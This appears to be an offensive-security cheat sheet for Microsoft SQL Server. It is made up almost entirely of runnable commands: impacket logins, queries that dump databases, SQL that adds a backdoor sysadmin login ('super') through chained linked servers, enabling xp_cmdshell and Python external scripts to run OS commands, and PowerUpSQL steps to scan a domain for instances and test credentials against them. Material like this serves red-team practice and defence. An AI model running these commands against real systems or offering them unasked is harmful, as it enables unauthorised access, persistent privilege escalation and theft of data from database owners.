# MSSQL Database Authentication and Dumping

### Commands:

#### 1) Kerberos auth

    impacket-mssqlclient -k DOMAIN.LOCAL -no-pass

#### 2) Windows Authentication (Domain Credentials)

    impacket-mssqlclient -windows-auth DOMAIN\\USERNAME@TARGET_IP

#### 3) Local Authentication

    impacket-mssqlclient USERNAME@TARGET_IP 

### DATABASE COMMANDS

#### 1) Enumerate all databases within MSSQL instance

    SELECT name FROM sys.databases; 

#### 2) Enumerate tables of the target database
    
    SELECT TABLE_NAME,TABLE_SCHEMA FROM targetdb.INFORMATION_SCHEMA.TABLES; 

#### 3) Dump all the contents of the target table of the target database
    
    SELECT * FROM targetdb.dbo.targettable 

### GIVE ACCESS TO A DATABASE WITH SYSADMIN PRIVILEGES

#### 1) Upon login, check if the user is a sysadmin

    SELECT IS_SRVROLEMEMBER('sysadmin');

If 1, the user is sysadmin.

#### 2) Give user full access to target DB

    use DATABASE;
    create user [DOMAIN\user] for login [DOMAIN\user];
    exec sp_addrolemember 'db_owner', 'DOMAIN\user';

#### 3) Dump tables from target DB

    select name from sys.tables;

### LINKED DATABASES ABUSE

#### 1) Check if our user has admin privileges to run commands with xp_cmdshell

    select name,sysadmin from syslogins; 

OR 

    SELECT IS_SRVROLEMEMBER('sysadmin');

If it returns 1, the user has admin privileges.

#### 2) Check if there are any linked servers on the current database. Isremote determines if it is linked or remote. If it is 1, it means it is linked, else is remote.

    select srvname, isremote from sysservers; 

#### 3) Check in whose context we are able to query the linked server

    EXEC ('select current_user') at [NAME\REMOTE_DATABASE]; 

#### 4) Check for sysadmin sa privileges

    EXEC ('select name,sysadmin from syslogins') at [NAME\REMOTE DATABASE]; 

#### 5) Check the remote DB server if it has more links

    EXEC ('select srvname,isremote from sysservers') at [NAME\REMOTE_DATABASE]; 

#### 6) Nested queries. This use case means that we have encountered a circular link between database servers!

    EXEC ('EXEC (''select susername()'') at [NAME\DATABASE]') at [NAME\REMOTE DATABASE]; 

#### 7) If we are sa, then we add a user with sysadmin privileges for us

    EXEC ('EXEC (''EXEC sp_addlogin ''''super'''', ''''abc123!'''''') at [NAME\DATABASE]') at [NAME\REMOTE DATABASE];

    EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''super'''', ''''sysadmin'''''') at [NAME\DATABASE]') at [NAME\REMOTE DATABASE];

### COMMAND EXECUTION WITH XP_CMDSHELL

#### 1) Enable command execution

    enable xp_cmdshell 
 
    xp_cmdshell whoami

#### 2) Enable execution of external scripts written in R or python

    EXECUTE sp_configure 'external scripts enabled', 1; 

#### 3) Run commands using Python

    EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("COMMAND");'; 

# MSSQL Tool: PowerUpSQL

Link: https://github.com/NetSPI/PowerUpSQL

Import Module

    Import-Module .\PowerupSQL.psd1

### Enumerating from the network without domain session

#### 1) Get local MSSQL instance (if any)

    Get-SQLInstanceLocal
    Get-SQLInstanceLocal | Get-SQLServerInfo

#### 2) If you don't have an AD account, you can try to find MSSQL scanning via UDP

First, you will need a list of hosts to scan

    Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them

The discovered MSSQL servers must be on the file: C:\temp\instances.txt

    Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username USERNAME -Password PASSWORD

### Enumerating from inside the domain

#### 1)  Get local MSSQL instance (if any)

    Get-SQLInstanceLocal
    Get-SQLInstanceLocal | Get-SQLServerInfo

#### 2) #Get info about valid MSQL instances running in domain

This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)

    Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#### 3) Test connections with each one

    Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#### 4) Try to connect and obtain info from each MSSQL server (also useful to check connectivity)

    Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

##### 5)  Get DBs, test connections, and get info in oneliner

    Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
